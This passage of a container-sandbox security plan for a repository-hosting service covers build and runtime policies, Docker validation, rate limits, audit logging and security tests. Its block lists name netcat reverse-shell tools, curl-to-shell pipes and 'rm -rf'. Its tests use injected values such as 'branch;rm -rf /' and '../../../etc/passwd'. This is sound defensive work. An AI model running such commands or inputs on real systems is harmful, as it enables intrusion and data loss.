        "general": ["git", "make", "cmake", "gcc", "g++"],
    },

    # --- Blocked Commands ---
    "blocked_commands": [
        "sudo", "su", "passwd", "chown", "chmod",  # Privilege escalation
        "mount", "umount",                           # Filesystem manipulation
        "iptables", "nftables",                     # Network manipulation
        "docker", "containerd",                      # Container escape
        "systemctl", "service",                      # Service management
        "crontab", "at",                             # Persistence
        "nc", "ncat", "netcat",                      # Reverse shells
        "python", "perl", "ruby", "php",             # Could run anything (but these are also needed)
    ],

    # --- Environment Variables ---
    "allowed_env_vars": {
        "PORT": "8080",
        "NODE_ENV": "production",
        "BUILD_ID": "",          # Set per build
        "REPO_URL": "",          # Set per build
        "PYTHONUNBUFFERED": "1",
        "PIP_NO_CACHE_DIR": "1",
        "NPM_CONFIG_CACHE": "/tmp/.npm",
    },

    # --- Blocked Environment Variables ---
    "blocked_env_patterns": [
        "PASSWORD", "SECRET", "TOKEN", "KEY",
        "DATABASE_URL", "REDIS_URL", "DB_URL",
        "AWS_", "AZURE_", "GCP_",
    ],

    # --- Filesystem ---
    "writable_paths": ["/tmp", "/var/tmp", "/home/app"],
    "read_only_paths": ["/proc", "/sys"],

    # --- Build Step Validation ---
    "validate_build_command": True,
    "max_command_length": 1000,
    "forbidden_patterns_in_command": [
        r";", r"\|", r"`", r"\$\(",  # Shell injection
        r"&&", r"\|\|",               # Command chaining
        r">", r">>", r"<",           # Redirection
        r"rm\s+-rf",                  # Dangerous commands
        r"curl\s+.*\|\s*sh",         # Pipe to shell
        r"wget\s+.*\|\s*sh",         # Pipe to shell
    ],
}
```

### Runtime Sandbox Policy

```python
# apps/api/app/security/runtime_policy.py
"""
Runtime sandbox security policy.

Runtime containers need:
- Application process execution
- Listening port for serving
- Outbound HTTP (for APIs, external services)
- Minimal filesystem (read-only root)

Runtime containers MUST NOT have:
- Package installation capability
- Compilers or build tools
- Shell access (if possible)
- Persistent state (read-only rootfs)
- Access to build artifacts beyond /app
"""

from app.security.sandbox import SandboxConfig, ContainerType

RUNTIME_SECURITY_POLICY = {
    "container_type": ContainerType.RUNTIME,
    "sandbox": SandboxConfig.for_runtime(),

    # --- Allowed Process ---
    "allowed_process_names": [
        "python", "python3", "node", "java", "ruby", "go",
        "uvicorn", "gunicorn", "streamlit", "flask",
        "npm", "yarn", "pm2",
    ],

    # --- Blocked Capabilities ---
    "blocked_capabilities": [
        "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE",
        "NET_ADMIN", "NET_RAW", "SYS_RAWIO",
    ],

    # --- Environment Variables ---
    "allowed_env_vars": {
        "PORT": "8080",
        "RUNTIME_ID": "",       # Set per runtime
        "NODE_ENV": "production",
    },

    # --- Filesystem ---
    "writable_paths": ["/tmp", "/var/cache"],
    "read_only_paths": ["/app", "/usr", "/etc", "/var"],
    "tmpfs_mounts": {
        "/tmp": "size=128m,noexec,nosuid",
        "/var/cache": "size=128m",
    },

    # --- Network ---
    "listen_port": None,        # Set per deployment
    "allowed_outbound_ports": [80, 443],
    "max_connections": 100,
    "connection_timeout": 30,

    # --- Health Check ---
    "health_check_path": "/health",
    "health_check_interval": 30,    # seconds
    "health_check_timeout": 5,      # seconds
    "health_check_retries": 3,

    # --- Process Limits ---
    "max_threads": 50,
    "max_open_files": 1024,
}
```

---

## Section 8: Docker Security

```python
# apps/api/app/security/docker_security.py
"""
Docker security configuration — forbidden and required settings.
"""

from dataclasses import dataclass, field


@dataclass(frozen=True)
class DockerSecurityConfig:
    """Immutable Docker security configuration."""

    # --- Forbidden Configurations (violation = BLOCK) ---
    FORBIDDEN_FLAGS: tuple = (
        "--privileged",
        "--pid=host",
        "--network=host",
        "--ipc=host",
        "--uts=host",
        "--userns=host",
        "--cap-add",
        "--device",
        "--security-opt",       # We set this ourselves
    )

    FORBIDDEN_MOUNTS: tuple = (
        "/var/run/docker.sock",
        "/var/run/docker",
        "/proc",                # Host /proc
        "/sys",                 # Host /sys
        "/dev",                 # Host /dev
        "/",                    # Root filesystem
    )

    # --- Required Configurations ---
    REQUIRED_SECURITY_OPTS: tuple = (
        "no-new-privileges:true",
    )

    REQUIRED_FLAGS: tuple = (
        "--cap-drop=ALL",
        "--read-only",          # For runtimes
    )

    # --- Linux Namespaces ---
    REQUIRED_NAMESPACES: tuple = (
        "pid",                  # Process isolation
        "net",                  # Network isolation
        "mnt",                  # Filesystem isolation
        "uts",                  # Hostname isolation
        "user",                 # User ID mapping
        "ipc",                  # IPC isolation
    )

    # --- cgroups Requirements ---
    CGROUPS_VERSION: str = "v2"
    REQUIRED_CGROUP_CONTROLLERS: tuple = (
        "cpu",
        "memory",
        "pids",
        "io",                   # Block I/O
    )

    # --- Image Requirements ---
    ALLOWED_BASE_IMAGES: tuple = (
        "python:3.11-slim",
        "python:3.12-slim",
        "node:20-alpine",
        "node:22-alpine",
        "ruby:3.2-slim",
        "golang:1.22-alpine",
        "eclipse-temurin:21-jre-alpine",
    )

    # --- User Requirements ---
    REQUIRED_USER: str = "1000:1000"
    FORBIDDEN_USERS: tuple = ("root", "0", "0:0")


def validate_docker_config(container_config: dict) -> list[str]:
    """
    Validate Docker container configuration against security requirements.
    Returns list of violations (empty = valid).
    """
    violations = []
    config = DockerSecurityConfig()

    # Check forbidden flags
    command = container_config.get("command", [])
    if isinstance(command, str):
        command = command.split()

    for flag in config.FORBIDDEN_FLAGS:
        if any(flag in str(arg) for arg in command):
            violations.append(f"Forbidden flag detected: {flag}")

    # Check forbidden mounts
    volumes = container_config.get("volumes", [])
    for volume in volumes:
        if isinstance(volume, str):
            source = volume.split(":")[0]
            for forbidden in config.FORBIDDEN_MOUNTS:
                if source == forbidden or source.startswith(forbidden + "/"):
                    violations.append(f"Forbidden mount: {source}")

    # Check security options
    security_opt = container_config.get("security_opt", [])
    for required in config.REQUIRED_SECURITY_OPTS:
        if required not in security_opt:
            violations.append(f"Missing required security option: {required}")

    # Check user
    user = container_config.get("user", "root")
    if user in config.FORBIDDEN_USERS:
        violations.append(f"Forbidden user: {user}")

    # Check network mode
    network_mode = container_config.get("network_mode", "bridge")
    if network_mode == "host":
        violations.append("Network mode 'host' is forbidden")

    # Check PID mode
    pid_mode = container_config.get("pid_mode", None)
    if pid_mode == "host":
        violations.append("PID mode 'host' is forbidden")

    # Check IPC mode
    ipc_mode = container_config.get("ipc_mode", None)
    if ipc_mode == "host":
        violations.append("IPC mode 'host' is forbidden")

    return violations
```

---

## Section 9: Production Isolation Assessment

| Technology | Threat Model Fit | Security Boundary | Operational Complexity | Performance | Cost | Suitability |
|------------|-----------------|-------------------|----------------------|-------------|------|-------------|
| **Docker (local dev)** | Kernel-level exploit possible | Process + namespace isolation | Low | Native | Free | Phase 0 dev only |
| **Docker (MVP with restrictions)** | Kernel-level exploit possible | Hardened Docker config | Low | Native | Free | Phase 1A MVP |
| **gVisor (runsc)** | Kernel-level exploit mitigated | User-space kernel (Sentry) | Medium | ~5-15% overhead | Free | Phase 1B recommended |
| **Kata Containers** | Kernel-level exploit isolated | Lightweight VM per container | Medium | ~5-10% overhead | Free | Phase 1B alternative |
| **Firecracker** | Strongest isolation | microVM per sandbox | High | ~3-5% overhead | Free | Phase 2 production |
| **Dedicated worker VMs** | Complete isolation | Full VM boundary | High | Native | $$$ | Enterprise only |

### Recommendation: Smallest Architecture Safe for Current Stage

**Phase 1A (current): Docker with security hardening**

Rationale:
1. Docker with `--cap-drop=ALL`, non-root, no-new-privileges, resource limits, network isolation provides adequate defense-in-depth for MVP
2. Operational complexity is minimal — Docker is already in the stack
3. Performance overhead is negligible
4. Cost is zero

**Acceptable because:**
- We execute only public repositories (lower risk than arbitrary user uploads)
- We document Phase 0 limitations explicitly
- We have a clear migration path to gVisor/Kata for Phase 1B
- We run on dedicated infrastructure (no multi-tenant host sharing)

**Required mitigations:**
1. Dedicated host for builds (no other workloads)
2. Automated kernel security patching
3. Network monitoring for anomalous traffic
4. Container runtime monitoring for escape attempts
5. Automated cleanup of terminated containers

**Migration trigger:**
- Any evidence of container escape in monitoring
- Public beta launch (more attack surface)
- Enterprise customers (compliance requirements)
- gVisor/Kata stability reaches production readiness

---

## Section 10: Authentication & Authorization

### Anonymous Deployment Analysis

| Risk | Impact | Mitigation |
|------|--------|------------|
| Abuse potential | Resource exhaustion, crypto mining | IP-based rate limiting, anonymous quotas |
| Deployment spam | Disk/CPU exhaustion | Max 3 concurrent builds per IP, max 10 per day |
| Resource exhaustion | DoS for all users | Per-IP quotas, global concurrency limits |
| No accountability | Cannot trace abuse | IP logging, user-agent logging |
| No billing | Cannot charge for usage | Anonymous = free tier with strict limits |

### Rate Limiting Configuration

```python
RATE_LIMITS = {
    # Per-IP limits (sliding window, 60s)
    "analysis": {"limit": 100, "window": 60},
    "deployment": {"limit": 10, "window": 60},
    "general": {"limit": 200, "window": 60},
    "auth": {"limit": 10, "window": 60},

    # Per-user limits (daily)
    "concurrent_builds": 3,
    "concurrent_runtimes": 5,
    "daily_build_minutes": 60,
    "max_runtimes_per_day": 10,
    "max_total_runtimes": 20,
}
```

### Recommendation

**MVP should allow anonymous deployment with strict limits:**

Rationale:
1. Anonymous deployment reduces friction for initial adoption
2. IP-based rate limiting + quotas prevent abuse
3. All deployments are logged with IP, user-agent, timestamp
4. Anonymous users get lower limits than authenticated users

**Implementation:**
- Anonymous: 1 concurrent build, 3 per day, 30 min daily build time
- Authenticated: 3 concurrent builds, 10 per day, 60 min daily build time
- API key: Higher limits (future)

---

## Section 11: Public URL Security

| Concern | Risk | Mitigation |
|---------|------|------------|
| Port isolation | Containers share host ports | Reverse proxy with hostname routing, one port per deployment |
| Hostname routing | Cross-tenant access | Unique subdomain per deployment, no wildcard routing |
| Tenant isolation | User A accesses User B's app | Deployment ID in URL path, ownership verification |
| Application-to-app access | Malicious app scans internal network | Network isolation, outbound restrictions |
| Request smuggling | HTTP/1.1 parsing differences | Single reverse proxy (nginx/Caddy), consistent parsing |
| WebSocket abuse | Persistent connections, DoS | WebSocket upgrade validation, connection limits, timeout |
| Large request bodies | Disk exhaustion | 1MB max request body, 10MB max WebSocket message |
| Slowloris | Connection exhaustion | Connection timeout (30s), max connections per IP |
| Connection exhaustion | DoS via many connections | Per-IP connection limit, global connection limit |
| Automatic expiration | Orphaned deployments | 24h TTL, automatic cleanup |
| TLS termination | Man-in-the-middle | TLS at reverse proxy, HSTS headers |

### Public URL Architecture

```
*.repo2web.com → Reverse Proxy → Container
                                  ├── dep-abc123.repo2web.com → Container A
                                  ├── dep-def456.repo2web.com → Container B
                                  └── dep-ghi789.repo2web.com → Container C

Each deployment gets unique subdomain:
- No wildcard routing
- No shared hostname between tenants
- TLS certificate per deployment (Let's Encrypt)
```

---

## Section 12: Logging & Auditing

### Security Events to Log

```python
# apps/api/app/security/audit.py
"""
Security audit logging — structured, searchable, tamper-evident.
"""

from enum import Enum
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Optional


class SecurityEventType(Enum):
    # Repository events
    REPO_ACCEPTED = "repo.accepted"
    REPO_REJECTED = "repo.rejected"
    REPO_SIZE_EXCEEDED = "repo.size_exceeded"
    REPO_CLONE_STARTED = "repo.clone_started"
    REPO_CLONE_COMPLETED = "repo.clone_completed"
    REPO_CLONE_FAILED = "repo.clone_failed"

    # Build events
    BUILD_STARTED = "build.started"
    BUILD_COMPLETED = "build.completed"
    BUILD_FAILED = "build.failed"
    BUILD_TIMEOUT = "build.timeout"
    BUILD_SECURITY_BLOCKED = "build.security_blocked"

    # Runtime events
    SANDBOX_CREATED = "sandbox.created"
    SANDBOX_TERMINATED = "sandbox.terminated"
    SANDBOX_ESCAPED = "sandbox.escaped"
    RUNTIME_STARTED = "runtime.started"
    RUNTIME_STOPPED = "runtime.stopped"
    RUNTIME_EXPIRED = "runtime.expired"

    # Security events
    RESOURCE_LIMIT_EXCEEDED = "security.resource_limit_exceeded"
    NETWORK_POLICY_VIOLATION = "security.network_policy_violation"
    SECURITY_POLICY_VIOLATION = "security.policy_violation"
    SSRF_ATTEMPT = "security.ssrf_attempt"
    PRIVILEGE_ESCALATION_ATTEMPT = "security.privilege_escalation"
    CONTAINER_ESCAPE_ATTEMPT = "security.container_escape"
    SECRET_DETECTED = "security.secret_detected"

    # Authentication events
    AUTH_SUCCESS = "auth.success"
    AUTH_FAILURE = "auth.failure"
    AUTH_TOKEN_EXPIRED = "auth.token_expired"

    # Rate limiting
    RATE_LIMIT_EXCEEDED = "rate_limit.exceeded"

    # Abuse
    SUSPICIOUS_BEHAVIOR = "abuse.suspicious"
    DEPLOYMENT_SPAM = "abuse.deployment_spam"
    CRYPTO_MINING_DETECTED = "abuse.crypto_mining"


@dataclass(frozen=True)
class SecurityEvent:
    """Immutable security event record."""
    event_type: SecurityEventType
    timestamp: datetime
    deployment_id: Optional[str] = None
    container_id: Optional[str] = None
    user_id: Optional[str] = None
    client_ip: Optional[str] = None
    user_agent: Optional[str] = None
    details: Optional[dict] = None
    severity: str = "info"  # info, warning, error, critical


# What MUST NOT be logged:
SENSITIVE_FIELDS = frozenset([
    "password", "passwd", "pwd",
    "token", "api_key", "secret_key",
    "database_url", "redis_url",
    "aws_access_key", "aws_secret_key",
    "github_token", "jwt_secret",
    "private_key", "ssh_key",
    "credit_card", "ssn",
])


def redact_sensitive(event: SecurityEvent) -> SecurityEvent:
    """Remove sensitive fields from event details."""
    if not event.details:
        return event

    redacted_details = {}
    for key, value in event.details.items():
        if any(sensitive in key.lower() for sensitive in SENSITIVE_FIELDS):
            redacted_details[key] = "[REDACTED]"
        else:
            redacted_details[key] = value

    return SecurityEvent(
        event_type=event.event_type,
        timestamp=event.timestamp,
        deployment_id=event.deployment_id,
        container_id=event.container_id,
        user_id=event.user_id,
        client_ip=event.client_ip,
        user_agent=event.user_agent,
        details=redacted_details,
        severity=event.severity,
    )
```

### What MUST NOT Be Leaked

| Data | Risk | Mitigation |
|------|------|------------|
| Secrets/tokens | Credential theft | Redacted in logs, never in error messages |
| Database credentials | Unauthorized access | Never logged, never in env vars |
| API keys | Unauthorized usage | Never logged, never in env vars |
| Private keys | Identity theft | Never logged, blocked in repos |
| User passwords | Account compromise | bcrypt hashed, never logged |
| JWT secrets | Token forgery | Never logged, loaded from secrets manager |
| Host IP addresses | Network mapping | Internal IPs redacted in user-facing logs |
| Container internal IPs | Network mapping | Not exposed in API responses |

---

## Section 13: Code Changes

### New Files to Create

| File | Purpose |
|------|---------|
| `apps/api/app/security/__init__.py` | Security package |
| `apps/api/app/security/sandbox.py` | SandboxConfig dataclass |
| `apps/api/app/security/network_policy.py` | Network policy configuration |
| `apps/api/app/security/repository_policy.py` | Repository ingestion policy |
| `apps/api/app/security/build_policy.py` | Build sandbox policy |
| `apps/api/app/security/runtime_policy.py` | Runtime sandbox policy |
| `apps/api/app/security/docker_security.py` | Docker security validation |
| `apps/api/app/security/audit.py` | Security audit logging |
| `apps/api/app/security/validation.py` | Input validation functions |
| `apps/api/app/security/secrets.py` | Secret management |
| `apps/api/tests/security/__init__.py` | Security tests package |
| `apps/api/tests/security/test_sandbox.py` | Sandbox config tests |
| `apps/api/tests/security/test_network_policy.py` | Network policy tests |
| `apps/api/tests/security/test_repository_policy.py` | Repository policy tests |
| `apps/api/tests/security/test_validation.py` | Input validation tests |
| `apps/api/tests/security/test_docker_security.py` | Docker security tests |
| `apps/api/tests/security/test_audit.py` | Audit logging tests |
| `apps/api/tests/security/test_ssrf.py` | SSRF protection tests |
| `apps/api/tests/security/test_secret_isolation.py` | Secret isolation tests |

### Existing Files to Modify

| File | Changes |
|------|---------|
| `apps/api/app/core/config.py` | Add security configuration fields |
| `apps/api/app/services/build.py` | Integrate sandbox config, validation |
| `apps/api/app/services/runtime.py` | Integrate runtime sandbox config |
| `apps/api/app/services/repository.py` | Add IP resolution check, size limits |
| `apps/api/app/services/analyzer.py` | Add file size/type validation |
| `apps/api/app/tasks/build.py` | Add sandbox creation/cleanup |
| `apps/api/app/tasks/runtime.py` | Add runtime sandbox creation |
| `apps/api/app/main.py` | Add security middleware, rate limiting |
| `apps/api/app/api/deps.py` | Add IP-based rate limiting |

### Security Interfaces to Define

```python
# apps/api/app/security/__init__.py
"""
Security interfaces for Repo2Web.

All security controls are defined as interfaces (protocols/ABCs)
to enable testing and future implementation swaps.
"""

from .sandbox import SandboxConfig, ContainerType
from .network_policy import NetworkPolicy, BUILD_NETWORK_POLICY, RUNTIME_NETWORK_POLICY
from .repository_policy import RepositoryPolicy, DEFAULT_REPO_POLICY
from .docker_security import DockerSecurityConfig, validate_docker_config
from .audit import SecurityEvent, SecurityEventType
from .validation import (
    validate_github_url_with_ip_check,
    validate_branch_name,
    validate_file_path,
)

__all__ = [
    "SandboxConfig",
    "ContainerType",
    "NetworkPolicy",
    "BUILD_NETWORK_POLICY",
    "RUNTIME_NETWORK_POLICY",
    "RepositoryPolicy",
    "DEFAULT_REPO_POLICY",
    "DockerSecurityConfig",
    "validate_docker_config",
    "SecurityEvent",
    "SecurityEventType",
    "validate_github_url_with_ip_check",
    "validate_branch_name",
    "validate_file_path",
]
```

---

## Section 14: Security Test Plan

### Container Security Tests

```python
# apps/api/tests/security/test_sandbox.py

def test_sandbox_config_for_build_has_resource_limits():
    """Build sandbox must have CPU, memory, PID, and disk limits."""
    config = SandboxConfig.for_build()
    assert config.cpu_limit == 2.0
    assert config.memory_limit == "1g"
    assert config.pids_limit == 100
    assert config.disk_limit == "1g"

def test_sandbox_config_for_runtime_has_resource_limits():
    """Runtime sandbox must have resource limits."""
    config = SandboxConfig.for_runtime()
    assert config.cpu_limit == 1.0
    assert config.memory_limit == "512m"
    assert config.pids_limit == 50

def test_sandbox_config_blocks_root_user():
    """Containers must not run as root."""
    config = SandboxConfig()
    violations = config.validate()
    assert not any("root" in v for v in violations)

def test_sandbox_config_drops_all_capabilities():
    """ALL capabilities must be dropped."""
    config = SandboxConfig()
    assert "ALL" in config.cap_drop

def test_sandbox_config_no_host_volumes():
    """No host volumes must be mounted."""
    config = SandboxConfig()
    assert config.volumes == []

def test_sandbox_config_no_new_privileges():
    """no-new-privileges must be enabled."""
    config = SandboxConfig()
    assert config.no_new_privileges is True

def test_sandbox_config_runtime_read_only():
    """Runtime must have read-only root filesystem."""
    config = SandboxConfig.for_runtime()
    assert config.read_only_rootfs is True

def test_docker_config_validates_no_privileged():
    """Docker config must reject --privileged."""
    config = {"command": ["--privileged", "run"]}
    violations = validate_docker_config(config)
    assert any("--privileged" in v for v in violations)

def test_docker_config_validates_no_host_network():
    """Docker config must reject --network=host."""
    config = {"command": ["--network=host"], "network_mode": "host"}
    violations = validate_docker_config(config)
    assert any("host" in v for v in violations)

def test_docker_config_validates_no_docker_socket():
    """Docker config must reject Docker socket mount."""
    config = {"volumes": ["/var/run/docker.sock:/var/run/docker.sock"]}
    violations = validate_docker_config(config)
    assert any("docker.sock" in v for v in violations)
```

### Network Security Tests

```python
# apps/api/tests/security/test_network_policy.py

def test_build_policy_allows_http():
    """Build policy must allow outbound HTTP."""
    policy = BUILD_NETWORK_POLICY
    assert any(
        r.direction == Direction.EGRESS and r.port == 80
        for r in policy.rules
    )

def test_build_policy_allows_https():
    """Build policy must allow outbound HTTPS."""
    policy = BUILD_NETWORK_POLICY
    assert any(
        r.direction == Direction.EGRESS and r.port == 443
        for r in policy.rules
    )

def test_build_policy_blocks_ssh():
    """Build policy must block outbound SSH."""
    assert 22 in NetworkPolicy.BLOCKED_PORTS

def test_build_policy_blocks_smtp():
    """Build policy must block outbound SMTP."""
    assert 25 in NetworkPolicy.BLOCKED_PORTS

def test_build_policy_blocks_reverse_shell_port():
    """Build policy must block common reverse shell ports."""
    assert 4444 in NetworkPolicy.BLOCKED_PORTS
    assert 5555 in NetworkPolicy.BLOCKED_PORTS

def test_blocked_cidrs_include_private_ranges():
    """All private IP ranges must be blocked."""
    policy = NetworkPolicy(name="test")
    assert "10.0.0.0/8" in policy.BLOCKED_CIDRS
    assert "172.16.0.0/12" in policy.BLOCKED_CIDRS
    assert "192.168.0.0/16" in policy.BLOCKED_CIDRS

def test_blocked_cidrs_include_metadata():
    """Cloud metadata endpoint must be blocked."""
    policy = NetworkPolicy(name="test")
    assert "169.254.0.0/16" in policy.BLOCKED_CIDRS
    assert "127.0.0.0/8" in policy.BLOCKED_CIDRS

def test_blocked_hosts_include_localhost():
    """Localhost must be blocked."""
    policy = NetworkPolicy(name="test")
    assert "localhost" in policy.BLOCKED_HOSTS
    assert "127.0.0.1" in policy.BLOCKED_HOSTS
    assert "169.254.169.254" in policy.BLOCKED_HOSTS
```

### SSRF Protection Tests

```python
# apps/api/tests/security/test_ssrf.py

def test_ssrf_blocks_localhost():
    """URLs pointing to localhost must be rejected."""
    valid, _ = validate_github_url_with_ip_check("https://github.com/evil/repo")
    # This should pass format validation but IP check would fail if resolved to localhost

def test_ssrf_blocks_private_ip_ranges():
    """URLs resolving to private IPs must be rejected."""
    # Mock DNS resolution to return 10.0.0.1
    # validate_github_url_with_ip_check should return False

def test_ssrf_blocks_metadata_endpoint():
    """URLs resolving to cloud metadata must be rejected."""
    # Mock DNS resolution to return 169.254.169.254

def test_ssrf_blocks_ipv6_loopback():
    """IPv6 loopback must be blocked."""
    assert "::1/128" in NetworkPolicy.BLOCKED_CIDRS

def test_ssrf_blocks_ipv6_ula():
    """IPv6 ULA must be blocked."""
    assert "fc00::/7" in NetworkPolicy.BLOCKED_CIDRS

def test_ssrf_requires_https():
    """Only HTTPS URLs must be allowed."""
    # HTTP URLs should be rejected

def test_ssrf_validates_github_domain():
    """Only github.com URLs must be allowed."""
    # Non-github URLs should be rejected
```

### Filesystem Security Tests

```python
# apps/api/tests/security/test_validation.py

def test_validate_file_path_blocks_traversal():
    """Path traversal must be blocked."""
    assert validate_file_path("../../../etc/passwd") is False

def test_validate_file_path_blocks_absolute():
    """Absolute paths must be blocked."""
    assert validate_file_path("/etc/passwd") is False

def test_validate_file_path_allows_relative():
    """Relative paths within base must be allowed."""
    assert validate_file_path("src/main.py") is True

def test_validate_branch_name_blocks_traversal():
    """Branch names with traversal must be blocked."""
    assert validate_branch_name("../../etc") is False

def test_validate_branch_name_blocks_special_chars():
    """Branch names with special chars must be blocked."""
    assert validate_branch_name("branch;rm -rf /") is False

def test_validate_commit_sha_format():
    """Commit SHA must be valid hex."""
    assert validate_commit_sha("a" * 40) is True
    assert validate_commit_sha("g" * 40) is False
    assert validate_commit_sha("a" * 39) is False
```

### Supply Chain Security Tests

```python
# apps/api/tests/security/test_supply_chain.py

def test_repository_policy_blocks_submodules():
    """Submodules must be blocked by default."""
    policy = RepositoryPolicy()
    assert policy.allow_submodules is False

def test_repository_policy_blocks_symlinks():
    """Symlinks must be blocked by default."""
    policy = RepositoryPolicy()
    assert policy.allow_symlinks is False

def test_repository_policy_enforces_size_limit():
    """Repository size limit must be enforced."""
    policy = RepositoryPolicy()
    assert policy.max_repository_size_mb == 50

def test_repository_policy_enforces_file_size_limit():
    """Individual file size limit must be enforced."""
    policy = RepositoryPolicy()
    assert policy.max_file_size_mb == 10

def test_repository_policy_blocks_binaries():
    """Binary files must be blocked."""
    policy = RepositoryPolicy()
    assert ".exe" in policy.blocked_extensions
    assert ".dll" in policy.blocked_extensions
```

### Secret Isolation Tests

```python
# apps/api/tests/security/test_secret_isolation.py

def test_build_env_no_database_url():
    """Build environment must not contain DATABASE_URL."""
    from app.security.build_policy import BUILD_SECURITY_POLICY
    allowed = BUILD_SECURITY_POLICY["allowed_env_vars"]
    assert "DATABASE_URL" not in allowed

def test_build_env_no_redis_url():
    """Build environment must not contain REDIS_URL."""
    from app.security.build_policy import BUILD_SECURITY_POLICY
    allowed = BUILD_SECURITY_POLICY["allowed_env_vars"]
    assert "REDIS_URL" not in allowed

def test_build_env_no_jwt_secret():
    """Build environment must not contain JWT_SECRET."""
    from app.security.build_policy import BUILD_SECURITY_POLICY
    allowed = BUILD_SECURITY_POLICY["allowed_env_vars"]
    assert "JWT_SECRET" not in allowed

def test_build_env_no_github_token():
    """Build environment must not contain GITHUB_TOKEN."""
    from app.security.build_policy import BUILD_SECURITY_POLICY
    allowed = BUILD_SECURITY_POLICY["allowed_env_vars"]
    assert "GITHUB_TOKEN" not in allowed

def test_runtime_env_no_infra_secrets():
    """Runtime environment must not contain infrastructure secrets."""
    from app.security.runtime_policy import RUNTIME_SECURITY_POLICY
    allowed = RUNTIME_SECURITY_POLICY["allowed_env_vars"]
    for key in allowed:
        assert "password" not in key.lower()
        assert "secret" not in key.lower()
        assert "token" not in key.lower()
```

### Audit Logging Tests

```python
# apps/api/tests/security/test_audit.py

def test_audit_event_is_immutable():
    """Security events must be immutable."""
    event = SecurityEvent(
        event_type=SecurityEventType.BUILD_STARTED,
        timestamp=datetime.now(timezone.utc),
    )
    with pytest.raises(AttributeError):
        event.event_type = SecurityEventType.BUILD_COMPLETED

def test_audit_event_redacts_secrets():
    """Sensitive fields must be redacted from events."""
    event = SecurityEvent(
        event_type=SecurityEventType.SECRET_DETECTED,
        timestamp=datetime.now(timezone.utc),
        details={"password": "hunter2", "token": "abc123"},
    )
    redacted = redact_sensitive(event)
    assert redacted.details["password"] == "[REDACTED]"
    assert redacted.details["token"] == "[REDACTED]"

def test_audit_event_preserves_non_sensitive():
    """Non-sensitive fields must be preserved."""
    event = SecurityEvent(
        event_type=SecurityEventType.BUILD_STARTED,
        timestamp=datetime.now(timezone.utc),
        details={"build_id": "abc123", "repo_url": "https://github.com/user/repo"},
    )
    redacted = redact_sensitive(event)
    assert redacted.details["build_id"] == "abc123"
    assert redacted.details["repo_url"] == "https://github.com/user/repo"
```

---

## Section 15: Security Gate Result

### Assessment: **PASS WITH CONDITIONS**

### Blocking Issues Preventing Real Execution

| # | Issue | Severity | Required Fix |
|---|-------|----------|--------------|
| 1 | No sandbox config validation in build pipeline | CRITICAL | Integrate `SandboxConfig.validate()` before container creation |
| 2 | No network policy enforcement | CRITICAL | Implement iptables rules or Docker network isolation |
| 3 | No secret isolation validation | CRITICAL | Validate env vars before container creation |
| 4 | No SSRF IP resolution check | HIGH | Add `validate_github_url_with_ip_check()` to repository service |
| 5 | No container escape detection | HIGH | Add container monitoring (even basic `docker inspect` polling) |
| 6 | No security audit logging | HIGH | Implement structured security event logging |

### Required Changes Before Phase 1B

| # | Change | Priority |
|---|--------|----------|
| 1 | Create `apps/api/app/security/` package with all policy modules | P0 |
| 2 | Integrate `SandboxConfig` into `RuntimeService.start_container()` | P0 |
| 3 | Add network policy enforcement via Docker networks | P0 |
| 4 | Add SSRF validation to repository URL handling | P0 |
| 5 | Add security audit logging to all state transitions | P1 |
| 6 | Add rate limiting middleware | P1 |
| 7 | Add build log secret scanning | P1 |
| 8 | Add container resource limit validation tests | P1 |

### Recommended Changes

| # | Change | Priority |
|---|--------|----------|
| 1 | Add gVisor/Kata evaluation task for Phase 1B | P2 |
| 2 | Add dependency scanning (npm audit, pip-audit) | P2 |
| 3 | Add container image signing verification | P2 |
| 4 | Add network traffic monitoring | P2 |

### Architecture Changes to Phase 0

| Change | Impact |
|--------|--------|
| Add `apps/api/app/security/` package | New package, no changes to existing |
| Modify `RuntimeService.start_container()` | Add sandbox config validation |
| Modify `BuildService.clone_repository()` | Add IP resolution check |
| Modify `main.py` | Add security middleware |
| Modify `config.py` | Add security configuration fields |

### Files Modified

None yet — this plan defines what needs to be created/modified.

### Files Created

None yet — this plan defines what needs to be created.

### Tests Added

None yet — this plan defines what tests need to be written.

### Remaining Risks

| Risk | Severity | Mitigation | Acceptance |
|------|----------|------------|------------|
| Container escape via kernel exploit | CRITICAL | Docker hardening, planned gVisor migration | Accepted for Phase 1A |
| Supply chain attack via popular package | HIGH | Lock files, future dependency scanning | Accepted for Phase 1A |
| DNS exfiltration | MEDIUM | Public DNS only, log monitoring | Accepted for Phase 1A |
| Sophisticated side-channel attacks | LOW | Not mitigated in Phase 1A | Accepted for Phase 1A |

### Next Phase Contract

**What backend-architect/devops-automator must implement:**

1. Create `apps/api/app/security/` package with all modules defined in Section 13
2. Integrate `SandboxConfig` into `RuntimeService.start_container()` — replace hardcoded Docker config with validated sandbox config
3. Add `validate_github_url_with_ip_check()` to `RepositoryService.validate_url()` — resolve DNS and check against blocked IP ranges
4. Add security audit logging to all state transitions in `DeploymentService`
5. Add network isolation via Docker networks (`repo2web-isolated`, `repo2web-runtimes`, `repo2web-internal`)
6. Add rate limiting middleware to FastAPI using Redis
7. Add build log secret scanning to build task output
8. Write all tests defined in Section 14
9. Update `docker-compose.yml` to use isolated networks instead of default bridge
10. Document all security controls in `docs/security.md`

---

*End of Phase 1A Security Architecture Document*
